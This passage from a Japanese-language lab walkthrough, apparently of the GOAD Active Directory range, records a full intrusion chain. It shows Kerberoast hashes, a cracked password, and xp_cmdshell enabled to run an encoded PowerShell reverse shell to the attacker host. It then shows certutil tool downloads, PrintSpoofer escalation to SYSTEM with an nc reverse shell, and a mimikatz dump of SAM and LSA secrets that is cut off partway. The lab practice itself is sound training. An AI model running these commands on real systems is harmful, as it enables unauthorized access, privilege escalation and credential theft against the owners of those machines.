$krb5tgs$23$*sansa.stark$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sansa.stark*$bf87ed85f509050cb9c4bc9bc1ebc4b3$d97c2248c3c93175031e5ee7b7ac6dbcfeda023ac301233f84c952814d0ae75907868160dfa3faf02bfc3f75303731242930ddda5fd05bd7dc1b94d7c74f65901e232a42dafc8a0dbd2e09146db9731be56afca3b652fdf63f670164d408c0d68ed4b1cfe72044921607b7d422d219e410c9dc89f8616e42bc5ad2a88f9e8f4ba4d850b6c70acfa4381d54c816acc7430eba665c32743968c3a88255d79813fba891b7fbb5363dc34f36d7804828ed6ddf861b8c05f8352c2b7f8a353a689d4ba81a8fc0870ae811ec434fc680574b7f28392c8d94860b382f952e8f459f0acacad27bbead52c4871fa8b8ae20636e91559ca9e5dc7bea78b0c7f69eb45c18f125417372c04aec71e214c994e729f3233fb5cc12384c8e3f3a6592fc4cdf9ef2c6f278ba0a9dd0141e0f2b8c8a9f7bba18a361ac4fdea1eaee5c5c591c4c1eedd85f59d5aa65556aed9781746c640f608835e8b4dbf12c6ac02b24442d512f6e2adc16f9d4a2885199e013454070019a020b2b784a5fac13640083adb47f79844e1a955dfde141eeea322fd5afebf3f2fe965b0fac8e4d59f3a82b39132ad0cb4abf08023ca376fc03dac5ea64f4b2e9a390fea2f61a450668c0bc28033ee23700775ad9b0d04dd93889aff254158591b8594f776507a1af014c99255a53e0faba14912bfacba8f83e362aadd8e26f6635444a254ca2835e76c2767d4adcd874cf8ffcff4856b3895858beb8ef08731a0e4ea0ef89e361d98fc187e03fe1f001ad111f40f0a51dedb76fd6314a923763149c41ab0ac9dd6a98864a29af3ed41730bbaaca41ee790c2c2e1ed611a1cfcd453ad150baf78df2a644d7e391992c4bda2749cac689bbdc26134842dc98b4a0c5b4bc203b386949434219d539a133b986c2c0cef28740b3c1ad3d78a950d168605ca84b0ac8954c4824e46bc6590cbb8ae512fd785bb9dacd7cc7c33460b123ff42364764c66025924639cab6c0ddc83ef8bd72e31672b13e29ca1d3cfa96d55ba7afaf84101f11e7c3e1e30781adc202e6ba4e16ac39a45441e84b2a5c37111cf8eae606a0ef78a93ab43a616075cbffb3f32290c16a712aa91ca6d4ad948d3a293a8250053c1c42a2f85f482adb2db27ab232df723cb04685832c12074d58f7a367c607fec7e64cd8e6ce2785aeb19f39cf594322ac3cc9d0dd1df8575a34bf43f9e6a9a48f4b34869c140729f2e840ccd85e12f0b4bbbe320829808eaa20821963ba99b3c53e944bad33eb40a9bf6dd0fb435012db27c2b2cd1da77dd45eaeec99d25f271ab1dfd53c7f288857e11a46513327b6864ca318952adc64a592d70bdc5423e197599adf1528204942eae617acc46bf8ce3981b4997d9ad0e081f97e346be53276ae681e47107d84a170c7897e2639360e854b354fc636a76330f7782f0d9c291fc34fb0f6757f5bc3136da99a801b40a095a5366495dada35d7f145462f
$krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$1e15ebd4698ad759a436a2f71a909132$b42a5b1a30e777ad8d7c601960a2dff52b1a169e622c7ec19b8590db742d2193e37c045574f6c64c63b945e43fb29d98dd7ef949486ecd8aa777f05af301d82bb09976c36c05875e56a6c28407d42a5414fb221a10dac81c1bcc2ce3b79b9a8256795352b1e484093d620ce7661ef114d9dc32f17198690da6194b428c4d9ef129e0712d464bf7e0678d4ad98ab4891e1ee08f22f2431fd854f897c969afec28a69116d61c3754bfc996ceff186556e3829e65f0e8f4a283aa29da68fadd1d3f114ede4209463dbdf440c379af909b24546a94cfe7b011835991ebcc8ecbc85ec466b3eb3efe14f74f120504e90aff3a372ab6ffabfde83bebeaaca06120dd911220aa7ed90b7dd7f8c616598ca0e65b1d3cbd9634cb642cd921dd0a5f358289de761cfafad823e44fd3ab88198034468e8856b566f83308b3e96da3b453f152c8fe43fe6d8b56fa8964f9316154ed02e4e9b163df1d1444d52973424a298ee42565dd78ffbff60c9550370a35601bc0eeb36d4933ed4d183ea160513095641d6fae94ad3be51480b5de42ea9b3d0f3c4b0099af4788d4cee8a46385e5c8cb1a76372d53dae6360987327ccf896af81ef15133dc656ad5c76fb63f4469b7fe2024be0e78385228016c6cfdcd75a43698d1e420dd3be51acd362cabd31464e97c42a5c372bf12d745c86b7fd091e531aa59d64849b531a5e2cc798a83ec35c00b61638abfb30d7a0e43c066c7d6135b33207ec04ee52079b4c949b78a7f1fed453a6a6699276beba0f8ee8a81ce031ea8ddb47167b8115f5722196215d493ee8b284a24f7e9b3bfdce880aecd5753fd29fe72596838acc20170162e5982f82446799f82d17080c14456a7d32b7f6116183042a7699fa88a3739e01a8723763c3ec6dc861acf19a173cac258c82373e13fcbcadf39e447bad2c5fcc9272d456f5db378372eff4e0fc77ff78c59266ba32110f9a5e7cec3945c4dcd8c2f6816c25026622cea4831eaa2bc00fe05e15e5d2e694477e827de1bac27ac4dd33e0108ed0b3eebf500252eade9d2f8a575996f19d109a4cae73d3ae903f0f28be17281a9e13e83b43a47d13e2e60886dce9e92c65e80f8b87931491446af43fe34b7070e9b9b74b3f34e60de5871032408b60cae961a83c938243a6d800cc75e008b52b44a5212b1c9ca95b935c8c8cfc20988b23939e4e71b7f3a44331936374001ea35784201dca58d6bb18ee83eae94e1697b12b2eff215bf2ddfd92340e01c91dfcab5d0b800d2602a9819b0efb3360c8d0edef56ad368ed36fb3b1080e1227ca051ab708a4a4cc37e412880f9609c56b5c34d1bfd82c8e31cce1bedf3eb8daa3769505ab2ad67b2e76589bf3f01e823e3b9db0ad0da1eb06950e3966f31c6cdb1fded9fd85151a38a2a316f28299ab8b33f17a8cd583c5b2eaddec0c74c20158303ac8ec7111eabbe8acc1f4006b4cf6090a07f91df
$krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql_svc*$f2afc954ac537ec194d071e3bd454869$650ddbd0f20df022ed076fdb9d60d0fb143740a99dd20148f0e886f11ac2f50ea381a95cacc705cf41671e136490303763ebf7b5eab1103effa651180048a6f05048e1afa18e698af1e58c04025cdef18a7bc7111150320c43729c22aeb013e1f479c8f94100454f8325297fa870980d5d1e83fcdc6eb38d8d615a9b5da2fe960d417d3bc58ee76fffe1d86b0607a14b39ed332da4a89cc6adef87e7a4272d5d1db21ce301ebb3e56cb064196a1ea085181ce2147b6c401a48013b22ba0fb0e87d2c2f7fed42d6ef75e271b9aa9271719d9b2e84c72f5750c79a3064d8b2b3db0cdfccdbbbf932d6479c4bd1e62b547a46c08c14965e7095cb9038f6277046b66d7a45ec27ec17d5b74cc92a5b666b66a8f3ad00b216758f8f242b539743fa7f4f51120c3997a0a4393a9495d439fcbe68d9e45ebb5ff286640996bd1d20fc87a5cf2a24ef485377bfa9e76faf488ac671a3f16fdccc70706a2cfd326eb906b9658cd6afb4416dd4cb997012a5ca852e036c2da07099eac16660358a745b9c20a7d938fd01f1ab14e8adfe6f815944219c2f562fdc654706955e9dc3cd3723feac6d8ce4d023d5073c014eeb00881ffaecd266a04ee3f3fcc5a48e828c9591651276384db62da09854a4dc8e05a92efdba019e50bdf91c99f33e28179fad748e4485231d40f7d8dc04f0ca662ec14b9b03b7746f8bc55ee91053f004b91e5f7ea37afa089e014b1ad9efb33e13872c6e8b1178a0ab3835853c807b63cabc4b28a4e665f37ad2d0f108e886f4eb0fcd33725f59a3a588f850cbdce293e62f71d2537e34fa6bbc86f5f334b19f192d2958a18f285e2288c52ec38281e58c12d2b530cacbc071148cc6d1ff8a56904cd50b696fa315f97d2b5770c14c2f657e5c895a645267d84ac4efb4a3f8c6212506cf3d4467313eadb539381a098de77b9225f955c62b3b420d65401b36c781d49f5385095bbd8090e8f41642784119f68293418918662c16967703a474fb642f67bcad30af48bf7e75cc894844c00efc24a9b54cb9906cbc3f078b5f5f77494520dbfde3df18ca7dd55198fe0808a44e76ad96b75e8b492a45d1ffafcd09382af624fff3d21aab254970222fcc1bd5b101f8974cc84f7d4077d4f5f36460f8265af6ee7a2ab9078b91df8145975e25b605c5f254ba2eae75a4e4ef6de1e1ca0618e6f6138277d72788f9ee044ca5b514561c7a4a5d643bcefc9bfc6628a0a1d4c79d12ace8717704a0fb75159dd0728a0e214d30b4b72230932b320239c262a2cae8eac5d1a06709fbbba7200f4b683caf10d5361697df2ae2dc23c6517594c5b2653e50f865a6fd418b9a55fa33748c498bc0c114ae832bdd121f0f11bc4dd8618aaabe81aa011c09865f6661769fca1adcf34d4eb87d63224b8c3e2f19884cb1227f31b64463354ea03d86c36bef9a83fb3cd01917b87cb4e97d5c6667b71d3b41f20817e9
```

constrainedなユーザーのjon.snowのハッシュをクラックしてみる

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ john --format=krb5tgs jon.snow.krb5tgts --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iknownothing     (?)     
1g 0:00:00:02 DONE (2024-10-06 16:09) 0.3378g/s 2511Kp/s 2511Kc/s 2511KC/s ikulet..ikkezelf85
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`jon.snow/iknownothing` というクレデンシャルをゲット

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc mssql 192.168.56.10-12 192.168.56.22-23 -u jon.snow -p 'iknownothing'
MSSQL       192.168.56.22   1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
MSSQL       192.168.56.22   1433   CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing (Pwn3d!)
MSSQL       192.168.56.23   1433   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
MSSQL       192.168.56.23   1433   BRAAVOS          [-] essos.local\jon.snow:iknownothing (Login failed for user 'BRAAVOS\Guest'. Please try again with or without '--local-auth')
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

jon.snowはCASTELBLACKのmssqlにアクセスできる

### MSSQL Exploit

MSSQL経由で侵入してみる

```
$ impacket-mssqlclient north.sevenkingdoms.local/jon.snow:iknownothing@castelblack -windows-auth
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (NORTH\jon.snow  dbo@master)>
```

このサーバーのシステム管理者が誰なのか確認してみる

```
SQL (NORTH\jon.snow  dbo@master)> select loginname from syslogins where sysadmin = '1'
loginname                     
---------------------------   
sa                            

NORTH\sql_svc                 

NT SERVICE\SQLWriter          

NT SERVICE\Winmgmt            

NT SERVICE\MSSQL$SQLEXPRESS   

CASTELBLACK\vagrant           

NORTH\jon.snow 
```

ユーザー jon.snow が sysadmin としてリストされていることがわかる

`xp_cmdshell` を下記コマンドで有効にする

`enable_xp_cmdshell`

下記サイトでリバースシェルを作る

https://www.revshells.com/

ncで待ち受けまる

```
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:c7:e1:36 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 72631sec preferred_lft 72631sec
    inet6 fe80::e4c7:3d51:e066:24c9/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:58:30:f4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.104/24 brd 192.168.56.255 scope global dynamic noprefixroute eth1
       valid_lft 334sec preferred_lft 334sec
    inet6 fe80::5af0:79:dd52:80d1/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/castelblack]
└─$ rlwrap nc -lvnp 443
```

MSSQLで実行

```
SQL (NORTH\jon.snow  dbo@master)> sp_configure 'show advanced options', '1'
[*] INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NORTH\jon.snow  dbo@master)> reconfigure
SQL (NORTH\jon.snow  dbo@master)> sp_configure 'xp_cmdshell', 1
[*] INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NORTH\jon.snow  dbo@master)> reconfigure
SQL (NORTH\jon.snow  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAMAA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Reverse shellを取得できた

```
┌──(kali㉿kali)-[~]
└─$ ip a                                                                                                 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:c7:e1:36 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 85785sec preferred_lft 85785sec
    inet6 fe80::e4c7:3d51:e066:24c9/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:58:30:f4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.104/24 brd 192.168.56.255 scope global dynamic noprefixroute eth1
       valid_lft 586sec preferred_lft 586sec
    inet6 fe80::5af0:79:dd52:80d1/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ rwlap nc -lvnp 443  
rwlap: command not found
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 443  
listening on [any] 443 ...
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.22] 55053

PS C:\Windows\system32> 
```

権限を見てみる

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Windows\system32> 
```

`SeImpersonatePrivilege` が有効なので PrintSpoofer が使えるか試してみる

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

ひとまず手元の環境

```
┌──(kali㉿kali)-[~/goad/castelblack]
└─$ ls
castelblack.nmap  nc.exe         PrintSpoofer64.exe  SharpHound.ps1
mimikatz.exe      powerview.ps1  SharpHound.exe
┌──(kali㉿kali)-[~/goad/castelblack]
└─$ python2 -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
(Python3の組み込みHTTPサーバーがうまく動かなかったのでPython2で動かしている)
```

Castelblack側で下記のように `/tmp` に移動する。諸々のツール類を運び込んだりする作業はここで行う

```
PS C:\Windows\system32> cd /tmp
PS C:\tmp> certutil -urlcache -split -f http://192.168.56.104:8080/nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
PS C:\tmp> certutil -urlcache -split -f http://192.168.56.104:8080/PrintSpoofer64.exe

****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

Kali側でncでポートを開けておく

```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 80  
listening on [any] 80 ...
```

PowerShellでPrintSpooferを動かす

```
PS C:\tmp> .\PrintSpoofer64.exe -i -c ".\nc.exe 192.168.56.104 80 -e powershell"

```

リバースシェルが帰ってきている。whoamiでシステム管理者の権限があることが確認できる。

```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.22] 55063
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 
PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```

今度はmimikatzを運んで見る

```
$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/castelblack]
└─$ python2 -m SimpleHTTPServer 8080                           
Serving HTTP on 0.0.0.0 port 8080 ..
```

```
PS C:\Windows\system32> certutil -urlcache -split -f http://192.168.56.104:8080/mimikatz.exe
certutil -urlcache -split -f http://192.168.56.104:8080/mimikatz.exe
****  Online  ****
  000000  ...
  14ae00
CertUtil: -URLCache command completed successfully.
```

ハッシュをダンプする

```
PS C:\Windows\system32> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam

Domain : CASTELBLACK
SysKey : e726c3449239522103313bbfa17ae832
Local SID : S-1-5-21-4014308955-3248381926-711700073

SAMKey : 8ba6eb6e2d70bd1eac7ec4298c16ca0d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: dbd13e1c4e338284ac4e9874f7de6ef4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 3657700679fd58e85736b18c734f2374

* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANTAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
      aes128_hmac       (4096) : bb7b6aed58a7a395e0e674ac76c28aa0
      des_cbc_md5       (4096) : fe58cdcd13a43243
    OldCredentials
      aes256_hmac       (4096) : 05ebd58ad12ff00465687ed1e33e4631c4739859f369ae36a7f6fccbe795fb78
      aes128_hmac       (4096) : 778a45f4f133513b831ce562570ac6af
      des_cbc_md5       (4096) : 58bf1ff4c4f4b0f2
    OlderCredentials
      aes256_hmac       (4096) : aa3c962519c1e2dee9ffb53df04325424f812bba47279767ad25eaccffd18695
      aes128_hmac       (4096) : 2f72e6aa959c5ea08e11deabfce6ed55
      des_cbc_md5       (4096) : 62bf012513ea8c0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : VAGRANTAdministrator
    Credentials
      des_cbc_md5       : fe58cdcd13a43243
    OldCredentials
      des_cbc_md5       : 58bf1ff4c4f4b0f2

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4363b6dc0c95588964884d7e1dfea1f7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03a659ee63caba3a4abb578087d86a35

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2d64d3002108324d20638239c935473767a9d7ed14d3fbfdfb9dca09b0ca43c
      aes128_hmac       (4096) : 81a21c239b02db38b36589af9ca027a5
      des_cbc_md5       (4096) : d33ba768d95dc257

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : d33ba768d95dc257

RID  : 000003e8 (1000)
User : vagrant
  Hash NTLM: e02bc503339d51f71d913c245d35b50b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 503d6e8e5de1854c6257b711e268fe30

* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANT-2019vagrant
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
      aes128_hmac       (4096) : 0d7c6160ffb016857b9af96c44110ab1
      des_cbc_md5       (4096) : 16dc9e8ad3dfc47f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : VAGRANT-2019vagrant
    Credentials
      des_cbc_md5       : 16dc9e8ad3dfc47f

mimikatz # 
mimikatz # lsadump::secrets

Domain : CASTELBLACK
SysKey : e726c3449239522103313bbfa17ae832

Local name : CASTELBLACK ( S-1-5-21-4014308955-3248381926-711700073 )
Domain name : NORTH ( S-1-5-21-2343606889-1312097775-3500245986 )
Domain FQDN : north.sevenkingdoms.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {f577e818-b2ae-c757-1ce1-c340c37c62df}
  [00] {f577e818-b2ae-c757-1ce1-c340c37c62df} 0ba3686dd3c0e1bc912fad05b7544d38a2c57ffe99ae0282cde6eb1553647a56

Secret  : $MACHINE.ACC
cur/hex : 11 11 80 6e 0b f8 db 39 1c b1 c0 2c 64 11 c3 4b ce 4b 04 22 53 b8 62 a6 ba a7 4e 0a 76 54 78 09 99 ff 01 c1 d5 3d 59 8e d0 8f 16 8c 35 ca 13 30 35 83 a2 33 43 a9 65 fa 4b 8f 72 af df b6 33 71 b8 f3 d6 ae b4 5d 7e 1e 3c 3f 91 d4 f1 ee a5 97 7a 41 03 0a 4e 83 60 3b 6c 4d 78 db 03 72 8b c7 9b 04 1b 02 fc 53 94 3f 14 ce 01 4e d7 fa 7c 33 5c 7e 15 04 67 b8 db a0 02 32 56 d6 f3 76 15 0c 45 c7 bd e0 63 5e 2d 1e d5 38 48 68 5f 8a dd d1 00 82 7f 32 0d 24 d0 ca 91 02 a6 ca 78 24 ec c7 99 4f 0e d4 33 c3 25 a7 e7 2d 20 96 0c e3 79 75 70 27 22 18 fb fb 88 68 fb a0 03 7a ce 07 45 9c 34 eb 05 cf 05 c0 0b 9a 78 08 26 76 e4 5a 12 83 da 88 77 2c b7 88 1a 96 31 29 98 f4 9b 2b 92 a4 57 5a 46 be 4a 2d 83 9a 0e fd 7d 6f 5d 0b 30 f0 
    NTLM:20425334e9f78d883485696487ab1b67
    SHA1:8f582df44ed1c9e9c9d26be730c0b99226271cf4
old/text: Ne[&3Mqp!):;U8#4v*-RfAP_\r"g$aYuI UHU1ULGN>S.k:%(qp pLyzv(c+:ymAFVzKUhMjT5>)n0&x.:nEB6?vEv8G0SqH;z<uZ]08>6.rR2d-,8N%oN0a
    NTLM:f2128cf1b7f7b8aba5ba5e2bc89b9439
    SHA1:dd3838e03f855224da1aed2ceb1a0cdcfa4a352b

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 13 08 72 a1 a2 43 87 df 59 aa e0 5e 7d 4c a0 c9 8d d5 53 5d 86 a5 36 90 af 0f cd 44 90 28 0e de 09 9b c6 84 e1 1a 69 18 
    full: 130872a1a24387df59aae05e7d4ca0c98dd5535d86a53690af0fcd4490280ede099bc684e11a6918
    m/u : 130872a1a24387df59aae05e7d4ca0c98dd5535d / 86a53690af0fcd4490280ede099bc684e11a6918
old/hex : 01 00 00 00 f8 8a ba f4 5d f8 7a f3 1f 7a 1f 2d 8f c0 48 de 9f 8c a8 77 c0 90 ca 12 69 d8 47 13 c9 de 69 bc 50 3e ae 27 c6 ea 74 26 
    full: f88abaf45df87af31f7a1f2d8fc048de9f8ca877c090ca1269d84713c9de69bc503eae27c6ea7426
    m/u : f88abaf45df87af31f7a1f2d8fc048de9f8ca877 / c090ca1269d84713c9de69bc503eae27c6ea7426

Secret  : NL$KM
